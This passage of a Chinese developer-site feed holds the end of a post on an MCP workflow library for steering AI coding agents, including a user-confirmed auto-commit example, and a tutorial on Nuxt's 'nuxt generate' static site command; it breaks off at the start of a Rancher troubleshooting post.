<li>完善的 typescript 支持</li>
<li>支持 async await throw catch 等语法</li>
<li>对比其他工具特别轻量，完全基于 mcp 协议</li>
<li>配合 claude code 和 kimi-k2 &amp; deepseek 工作良好</li>
</ul>
<p>比如用我们再举上面的例子，如果用该工具去处理上面的问题，让 AI 从 1+...+n，同时排除所有位数之和加起来为 5 的倍数的数字，那么完整的写法如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ClaudeCodeTools</span>, registerWorkflowTool, <span class="hljs-title class_">Prompt</span>, z } <span class="hljs-keyword">from</span> <span class="hljs-string">"agent-workflow-mcp-tool"</span>;

<span class="hljs-keyword">const</span> server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">McpServer</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">"agent-workflow"</span>,
  <span class="hljs-attr">version</span>: <span class="hljs-string">"0.0.1"</span>,
});

<span class="hljs-title function_">registerWorkflowTool</span>(
  server,
  <span class="hljs-string">"workflow"</span>,
  {
    <span class="hljs-attr">title</span>: <span class="hljs-string">"workflow"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">`workflow control`</span>,
  },
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>* <span class="hljs-title class_">Workflow</span>() {
    <span class="hljs-keyword">const</span> count = <span class="hljs-keyword">yield</span>* <span class="hljs-title class_">ClaudeCodeTools</span>.<span class="hljs-title class_">AskUserQuestion</span>(
      <span class="hljs-string">`please input a number`</span>,
      z.<span class="hljs-title function_">number</span>()
    );

    <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= count; i++) {
      <span class="hljs-keyword">if</span> (
        <span class="hljs-keyword">yield</span>* <span class="hljs-title class_">Prompt</span>(
          <span class="hljs-string">`计算 "<span class="hljs-subst">${i}</span>" 的所有位数加起来之和是否为 5 的倍数`</span>,
          z.<span class="hljs-title function_">boolean</span>()
        )
      ) {
      } <span class="hljs-keyword">else</span> {
        sum += i;
      }
    }
    <span class="hljs-keyword">return</span> sum;
  }
);
</code></pre>
<p>这时你让 Claude Code 直接执行该 mcp</p>
<pre><code class="hljs language-bash" lang="bash">Ask: use mcp <span class="hljs-string">"agent-workflow"</span> tool <span class="hljs-string">"workflow"</span> directly
</code></pre>
<p>执行结果见下图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d95ddeaab14146d396ec12cdf6454c8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdm9kZXJs:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769161662&amp;x-signature=gDSpttUa%2BqFUe6o56yiD7imHBnk%3D" alt="image.png" loading="lazy"/></p>
<p>kimi-k2 真的严格按照代码给定的流程，从 1 + 2 + 直到加到 87，对每一个数字判断其所有数字加起来之和是否为 5 的倍数，调用了 87 次 mcp tool，最终得出了正确的结果。</p>
<p>可以在图中看出，在大模型每次调用 mcp 时，mcp 会给出当前的任务，如果大模型执行成功，大模型需要在下次调用时带上上次任务的执行结果。</p>
<p>每一步都有完善的 zod 类型校验，如果传参不对会给大模型提示，避免大模型的传参幻觉。</p>
<p>基于这样的 workflow，我们也可以把“对每一个数字判断其所有数字加起来之和是否为 5 的倍数”这一步可能会有大模型幻觉产生的步骤，改为使用代码来执行保证。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>* <span class="hljs-title class_">Workflow</span>() {
  <span class="hljs-keyword">const</span> count = <span class="hljs-keyword">yield</span>* <span class="hljs-title class_">ClaudeCodeTools</span>.<span class="hljs-title class_">AskUserQuestion</span>(
    <span class="hljs-string">`please input a number`</span>,
    z.<span class="hljs-title function_">number</span>()
  );

  <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= count; i++) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">sumDigits</span>(i) % <span class="hljs-number">5</span> === <span class="hljs-number">0</span>) {
    } <span class="hljs-keyword">else</span> {
      sum = <span class="hljs-keyword">yield</span>* <span class="hljs-title class_">Prompt</span>(<span class="hljs-string">`calculate <span class="hljs-subst">${sum}</span> + <span class="hljs-subst">${i}</span>`</span>, z.<span class="hljs-title function_">number</span>())
    }
  }
  <span class="hljs-keyword">return</span> sum;
}
</code></pre>
<h3 data-id="heading-2">更多复杂场景</h3>
<p>基于该工具，我们可以实现更复杂的逻辑，比如自动生成 commit 信息并在用户确认后提交代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">registerWorkflowTool</span>(
    server,
    <span class="hljs-string">"auto-commit"</span>,
    {
      <span class="hljs-attr">title</span>: <span class="hljs-string">"auto commit"</span>,
      <span class="hljs-attr">description</span>: <span class="hljs-string">`auto commit`</span>,
    },
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>* <span class="hljs-title class_">Workflow</span>() {
      <span class="hljs-keyword">const</span> filesChangeList = <span class="hljs-keyword">yield</span>* <span class="hljs-title class_">Prompt</span>(
        <span class="hljs-string">`获取当前变更文件列表`</span>,
        z.<span class="hljs-title function_">array</span>(z.<span class="hljs-title function_">string</span>())
      );

      <span class="hljs-keyword">if</span> (filesChangeList.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`没有任何代码更改`</span>;
      }

      <span class="hljs-keyword">const</span> commitMessage = <span class="hljs-keyword">yield</span>* <span class="hljs-title class_">Prompt</span>(
        <span class="hljs-string">`根据当前变更内容生成对应的 commit message，格式需满足：
(fix|feat|chore): 单行简洁的提示

多行详细变更内容`</span>,
        z.<span class="hljs-title function_">string</span>()
      );

      <span class="hljs-keyword">const</span> { is_confirm } = <span class="hljs-keyword">yield</span>* <span class="hljs-title class_">ClaudeCodeTools</span>.<span class="hljs-title class_">AskUserQuestion</span>(
        <span class="hljs-string">`commit message 为 <span class="hljs-subst">${commitMessage}</span>，是否确认继续`</span>,
        z.<span class="hljs-title function_">object</span>({
          <span class="hljs-attr">is_confirm</span>: z.<span class="hljs-title function_">boolean</span>(),
        })
      );

      <span class="hljs-keyword">if</span> (!is_confirm) <span class="hljs-keyword">return</span> <span class="hljs-string">`已取消`</span>;

      <span class="hljs-keyword">yield</span>* <span class="hljs-title class_">Prompt</span>(<span class="hljs-string">`将当前变更代码提交，commit message 为 <span class="hljs-subst">${commitMessage}</span>`</span>);
    }
  );
</code></pre>
<p>自动提交确认效果：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de8c238c5c5e4e1da2841f5d9833543c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdm9kZXJs:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769161662&amp;x-signature=0gOEnO6Upuv%2BG5cxEeUyJ7ij%2F3Y%3D" alt="image.png" loading="lazy"/></p>
<p>还可以基于上面的流程，在 commit 前获取所有变更文件，挨个给每一个文件都使用 AI review 一遍，可以试试看～</p>
<h3 data-id="heading-3">使用</h3>
<pre><code class="hljs">npm install agent-workflow-mcp-tool
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { registerWorkflowTool, <span class="hljs-title class_">Prompt</span>, <span class="hljs-title class_">ClaudeCodeTools</span>, z } <span class="hljs-keyword">from</span> <span class="hljs-string">'agent-workflow-mcp-tool'</span>;
</code></pre>
<p>欢迎使用和反馈～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[详细说一下nuxt generate是干啥的]]></title>    <link>https://juejin.cn/post/7595603381663924230</link>    <guid>https://juejin.cn/post/7595603381663924230</guid>    <pubDate>2026-01-16T10:21:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595603381663924230" data-draft-id="7595502583269539876" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="详细说一下nuxt generate是干啥的"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2026-01-16T10:21:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="江湖文人"/> <meta itemprop="url" content="https://juejin.cn/user/3044986347066480"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            详细说一下nuxt generate是干啥的
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3044986347066480/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    江湖文人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T10:21:52.000Z" title="Fri Jan 16 2026 10:21:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p><code>nuxt generate</code> 是 Nuxt.js 框架的一个**静态站点生成（Static Site Generation, SSG）**命令。我来详细解释一下它的含义和作用：</p>
<h2 data-id="heading-0">是什么？</h2>
<p><code>nuxt generate</code> 命令会将你的 Nuxt 应用预渲染为静态 HTML 文件。它会：</p>
<ul>
<li>为每个路由生成对应的 HTML 文件</li>
<li>将生成的静态文件保存在 <code>dist/</code> 目录中</li>
<li>包含必要的 CSS、JavaScript 和资源文件</li>
</ul>
<h2 data-id="heading-1">主要作用</h2>
<h3 data-id="heading-2">1. <strong>性能优化</strong></h3>
<ul>
<li>预生成的 HTML 文件无需服务器端渲染，加载速度极快</li>
<li>CDN 友好，可以轻松缓存</li>
<li>减少服务器压力和响应时间</li>
</ul>
<h3 data-id="heading-3">2. <strong>SEO 优化</strong></h3>
<ul>
<li>搜索引擎可以直接抓取静态 HTML 内容</li>
<li>更好的 SEO 表现（相比于纯客户端渲染）</li>
</ul>
<h3 data-id="heading-4">3. <strong>部署简单</strong></h3>
<ul>
<li>生成的文件可以部署到任何静态主机：
<ul>
<li>Netlify、Vercel、GitHub Pages</li>
<li>AWS S3、Firebase Hosting</li>
<li>Nginx、Apache 等传统服务器</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">4. <strong>成本效益</strong></h3>
<ul>
<li>无需专门的 Node.js 服务器</li>
<li>可以使用廉价的静态托管服务</li>
</ul>
<h2 data-id="heading-6">使用场景</h2>
<h3 data-id="heading-7">适合使用 <code>nuxt generate</code>：</h3>
<p>✅ <strong>内容型网站</strong>：博客、文档、营销页面<br/>
✅ <strong>数据不频繁变化</strong>：产品展示页、公司官网<br/>
✅ <strong>需要优秀 SEO</strong> 的应用<br/>
✅ <strong>高访问量</strong> 的只读页面</p>
<h3 data-id="heading-8">不适合使用（需要考虑 SSR 或 CSR）：</h3>
<p>❌ <strong>用户个性化内容</strong>：每个用户看到的内容不同<br/>
❌ <strong>实时数据</strong>：股票行情、聊天应用<br/>
❌ <strong>频繁更新</strong>：社交媒体动态<br/>
❌ <strong>需要身份验证</strong> 的页面（可通过混合模式解决）</p>
<h2 data-id="heading-9">基本使用</h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 生成静态文件</span>
nuxt generate

<span class="hljs-comment"># 生成后预览</span>
nuxt generate &amp;&amp; nuxt start

<span class="hljs-comment"># 构建并生成（常用）</span>
npm run generate
<span class="hljs-comment"># 在 package.json 中通常配置为：</span>
<span class="hljs-comment"># "scripts": {</span>
<span class="hljs-comment">#   "generate": "nuxt generate"</span>
<span class="hljs-comment"># }</span>
</code></pre>
<h2 data-id="heading-10">配置示例</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// nuxt.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">target</span>: <span class="hljs-string">'static'</span>, <span class="hljs-comment">// 明确指定为静态站点</span>
  <span class="hljs-attr">generate</span>: {
    <span class="hljs-comment">// 动态路由需要指定</span>
    <span class="hljs-attr">routes</span>: [
      <span class="hljs-string">'/users/1'</span>,
      <span class="hljs-string">'/users/2'</span>,
      <span class="hljs-string">'/blog/post-1'</span>
    ],
    <span class="hljs-comment">// 或者异步获取路由</span>
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">routes</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">await</span> $fetch(<span class="hljs-string">'/api/posts'</span>)
      <span class="hljs-keyword">return</span> posts.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">post</span> =&gt;</span> <span class="hljs-string">`/blog/<span class="hljs-subst">${post.id}</span>`</span>)
    }
  }
}
</code></pre>
<h2 data-id="heading-11">工作流程</h2>
<pre><code class="hljs language-css" lang="css">执行 nuxt generate
    ↓
Nuxt 启动构建过程
    ↓
为每个路由生成 <span class="hljs-selector-tag">HTML</span>
    ↓
提取 CSS 和 JavaScript
    ↓
保存到 dist/ 目录
    ↓
完成！可以部署到任何静态主机
</code></pre>
<h2 data-id="heading-12">与 <code>nuxt build</code> 的区别</h2>
<ul>
<li><strong><code>nuxt generate</code></strong>：生成静态 HTML 文件，用于静态托管</li>
<li><strong><code>nuxt build</code></strong>：构建应用，用于服务器端渲染（SSR）部署</li>
</ul>
<h2 data-id="heading-13">高级特性</h2>
<h3 data-id="heading-14">1. <strong>混合模式</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 部分页面静态生成，部分页面动态渲染</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">generate</span>: {
    <span class="hljs-attr">exclude</span>: [
      <span class="hljs-string">'/dashboard'</span>,  <span class="hljs-comment">// 这个页面保持动态</span>
      <span class="hljs-string">'/admin/**'</span>    <span class="hljs-comment">// 所有 admin 页面都动态</span>
    ]
  }
}
</code></pre>
<h3 data-id="heading-15">2. <strong>增量静态再生</strong></h3>
<p>可以通过定时任务重新生成部分页面。</p>
<h2 data-id="heading-16">实际示例</h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 创建 Nuxt 项目</span>
npx nuxi@latest init my-static-site

<span class="hljs-comment"># 2. 安装依赖</span>
<span class="hljs-built_in">cd</span> my-static-site
npm install

<span class="hljs-comment"># 3. 生成静态文件</span>
npm run generate

<span class="hljs-comment"># 4. 查看生成的文件</span>
<span class="hljs-built_in">ls</span> -la dist/
<span class="hljs-comment"># 会看到 index.html, about.html 等</span>

<span class="hljs-comment"># 5. 本地测试生成的文件</span>
npx serve dist/
</code></pre>
<p>总之，<code>nuxt generate</code> 是 Nuxt.js 强大的静态站点生成功能，特别适合需要优秀性能、SEO 和低成本部署的场景。对于适合静态化的项目，它能提供极佳的用户体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[幽灵节点导致Rancher状态卡死]]></title>    <link>https://juejin.cn/post/7595772638880677939</link>    <guid>https://juejin.cn/post/7595772638880677939</guid>    <pubDate>2026-01-16T09:29:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595772638880677939" data-draft-id="7595772638880563251" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="幽灵节点导致Rancher状态卡死"/> <meta itemprop="keywords" content="Kubernetes"/> <meta itemprop="datePublished" content="2026-01-16T09:29:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jevanshy"/> <meta itemprop="url" content="https://juejin.cn/user/3938906715990890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            幽灵节点导致Rancher状态卡死
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3938906715990890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jevanshy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:29:02.000Z" title="Fri Jan 16 2026 09:29:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li 